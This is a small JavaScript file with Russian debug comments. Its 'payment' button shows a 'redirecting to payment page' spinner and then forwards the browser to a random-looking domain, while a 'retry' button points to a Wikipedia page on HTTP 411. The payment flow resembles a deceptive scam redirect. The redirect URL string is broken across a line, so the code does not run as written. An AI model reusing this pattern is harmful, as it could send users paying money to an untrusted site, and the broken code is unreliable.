document.addEventListener('DOMContentLoaded', function() {
    console.log('Скрипт загружен!'); // Для отладки
    
    const paymentBtn = document.getElementById('payment-btn');
    const retryBtn = document.getElementById('retry-btn');
    
    if (paymentBtn) {
        console.log('Кнопка найдена'); // Для отладки
        
        paymentBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            console.log('Кнопка нажата, перенаправление...'); // Для отладки
            
            // Показываем состояние загрузки
            const originalHTML = paymentBtn.innerHTML;
            paymentBtn.innerHTML = `
                <div class="tg-btn-content">
                    <i class="fas fa-spinner fa-spin"></i>
                    <span>ПЕРЕНАПРАВЛЕНИЕ...</span>
                </div>
                <div class="tg-btn-sub">идёт переход на страницу оплаты</div>
            `;
            paymentBtn.disabled = true;
            
            // Перенаправляем через небольшую задержку
            setTimeout(() => {
                window.location.href = "https://ytey3yw3gws.org
                ";
                // Альтернатива: window.open("https://ru.wikipedia.org/wiki/HTTP_411", "_blank");
            }, 500);
        });
    } else {
        console.error('Кнопка payment-btn не найдена!'); // Для отладки
    }
    
    if (retryBtn) {
        retryBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            window.location.href = "https://ru.wikipedia.org/wiki/HTTP_411";
        });
    }
});
